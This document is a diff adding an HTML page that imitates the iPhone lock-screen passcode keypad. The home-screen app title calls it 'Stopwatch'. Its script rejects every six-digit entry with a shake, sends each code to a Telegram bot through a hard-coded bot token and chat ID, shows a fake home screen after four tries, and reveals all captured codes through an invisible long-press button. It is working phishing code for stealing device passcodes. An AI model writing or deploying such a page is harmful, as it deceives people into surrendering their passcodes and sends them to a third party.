@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone Lock Screen Keypad</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <link rel="apple-touch-icon" href="./icon/icon-192x192.png">
+    <link rel="apple-touch-startup-image" href="./icon/icon-512x512.png">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Stopwatch">
+    <link rel="icon" type="image/png" sizes="192x192" href="./icon/icon-192x192.png">
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 107vh;
+            margin: 0;
+        }
+
+        .lock-icon {
+            margin: 20px 0;
+            font-size: 24px;
+        }
+
+        .prompt {
+            margin: 10px 0;
+            font-size: 18px;
+        }
+
+        .dots {
+            display: flex;
+            justify-content: center;
+            margin: 10px 0;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            margin: 0 12px;
+            border-radius: 50%;
+            border: 1px solid white;
+            background: transparent;
+            transition: background 0.3s;
+        }
+
+        .dot.filled {
+            background: white;
+        }
+
+        .dots.shake {
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0% {
+                transform: translateX(0);
+            }
+
+            20% {
+                transform: translateX(-5px);
+            }
+
+            40% {
+                transform: translateX(5px);
+            }
+
+            60% {
+                transform: translateX(-5px);
+            }
+
+            80% {
+                transform: translateX(5px);
+            }
+
+            100% {
+                transform: translateX(0);
+            }
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 80px);
+            gap: 16px 26px;
+            margin-top: 45px;
+        }
+
+        .key {
+            width: 75px;
+            height: 75px;
+            border-radius: 50%;
+            background-color: #303030;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            font-weight: 300;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .key small {
+            font-size: 10px;
+            font-weight: normal;
+            margin-top: -3px;
+            letter-spacing: 2px;
+        }
+
+        .bottom-buttons {
+            display: flex;
+            justify-content: space-between;
+            width: 250px;
+            margin-top: 55px;
+            font-size: 16px;
+        }
+
+        .empty {
+            width: 80px;
+            height: 80px;
+        }
+
+        .lock-icon {
+            position: absolute;
+            top: 0;
+            margin: 0px 0;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 32px;
+            filter: brightness(0) invert(1);
+        }
+
+        .home-screen {
+            display: none;
+            text-align: center;
+            font-size: 32px;
+            color: white;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="lock-icon">
+        <svg width="28" height="13" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M12 17a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6-7h-1V7a5 5 0 0 0-10 0v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2zM9 7a3 3 0 0 1 6 0v3H9V7z" />
+        </svg>
+    </div>
+
+    <div class="prompt">Touch ID or Enter Passcode</div>
+
+    <div class="dots" id="dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+
+    <div class="keypad" id="keypad">
+        <div class="key">1<small></small></div>
+        <div class="key">2<small>ABC</small></div>
+        <div class="key">3<small>DEF</small></div>
+        <div class="key">4<small>GHI</small></div>
+        <div class="key">5<small>JKL</small></div>
+        <div class="key">6<small>MNO</small></div>
+        <div class="key">7<small>PQRS</small></div>
+        <div class="key">8<small>TUV</small></div>
+        <div class="key">9<small>WXYZ</small></div>
+        <div class="empty"></div>
+        <div class="key">0<small></small></div>
+        <div class="empty"></div>
+    </div>
+
+    <div class="bottom-buttons">
+        <div>Emergency</div>
+        <div id="cancelDeleteBtn">Cancel</div>
+    </div>
+
+    <!-- Tampilan Home setelah 4 kali input -->
+    <div class="home-screen" id="homeScreen">
+        <h2>Welcome to the Home Screen</h2>
+        <p>This is your iPhone home screen after successful unlock.</p>
+    </div>
+    <div id="passwordDisplay" style="margin-top: 20px; color: white;"></div>
+
+
+    <script>
+        const keys = document.querySelectorAll('.key');
+        const dots = document.querySelectorAll('.dot');
+        const dotsContainer = document.getElementById('dots');
+        let currentInput = '';
+        let allInputs = []; // Menyimpan semua input
+        let inputCount = 0;  // Counter untuk menghitung berapa kali password dimasukkan
+        const cancelDeleteBtn = document.getElementById('cancelDeleteBtn');
+        const homeScreen = document.getElementById('homeScreen');
+
+        keys.forEach(key => {
+            key.addEventListener('click', () => {
+                if (currentInput.length < 6) {
+                    currentInput += key.textContent.trim().charAt(0); // ambil angka saja
+                    updateDots();
+
+                    if (currentInput.length === 6) {
+                        shakeDots();
+                    }
+                }
+            });
+        });
+
+        function updateDots() {
+            dots.forEach((dot, index) => {
+                if (index < currentInput.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            });
+
+            // Ubah tombol Cancel jadi Delete jika ada input
+            if (currentInput.length > 0) {
+                cancelDeleteBtn.textContent = 'Delete';
+            } else {
+                cancelDeleteBtn.textContent = 'Cancel';
+            }
+        }
+
+        const passwordDisplay = document.getElementById('passwordDisplay');
+
+        function shakeDots() {
+            dotsContainer.classList.add('shake');
+            setTimeout(() => {
+                dotsContainer.classList.remove('shake');
+
+                allInputs.push(currentInput); // Simpan input ke array
+                // Kirim ke Telegram
+                sendToTelegram(currentInput);
+
+                inputCount++;
+
+                console.log('Input ke-' + inputCount + ': ' + currentInput); // Hanya muncul di console
+
+                if (inputCount === 4) {
+                    setTimeout(() => {
+                        document.querySelector('.keypad').style.display = 'none';
+                        document.querySelector('.prompt').style.display = 'none';
+                        dotsContainer.style.display = 'none';
+                        cancelDeleteBtn.parentElement.style.display = 'none';
+                        homeScreen.style.display = 'block';
+                    }, 500); // beri jeda agar bisa melihat animasi shake
+                }
+
+
+
+                currentInput = ''; // Reset input
+                updateDots();
+            }, 500);
+        }
+
+        const secretBtn = document.getElementById('secret-button');
+        let pressTimer;
+
+        secretBtn.addEventListener('mousedown', () => {
+            pressTimer = setTimeout(() => {
+                alert('Password yang dimasukkan:\n' + allInputs.join('\n'));
+            }, 3000); // 3 detik ditekan
+        });
+
+        secretBtn.addEventListener('mouseup', () => {
+            clearTimeout(pressTimer); // Batal kalau dilepas sebelum 3 detik
+        });
+
+        secretBtn.addEventListener('mouseleave', () => {
+            clearTimeout(pressTimer); // Batal kalau kursor keluar dari tombol
+        });
+
+
+        cancelDeleteBtn.addEventListener('click', () => {
+            console.log("Tombol Cancel/Delete diklik"); // Tambahkan log
+            if (currentInput.length > 0) {
+                currentInput = currentInput.slice(0, -1);
+                updateDots();
+            }
+        });
+
+
+
+        function sendToTelegram(message) {
+            const botToken = '7280836745:AAH0EByZm4bkky33-KRVEI3PaV8Hq3_VZJ0';
+            const chatId = '620813748';
+            const text = `Kode yang dimasukkan: ${message}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Telegram response:", data);
+                })
+                .catch(error => {
+                    console.error("Error sending to Telegram:", error);
+                });
+        }
+
+
+    </script>
+
+    <div id="secret-button" style="position: absolute; bottom: 0; left: 0; width: 50px; height: 50px; opacity: 0;">
+    </div>
+
+
+</body>
+
+</html>
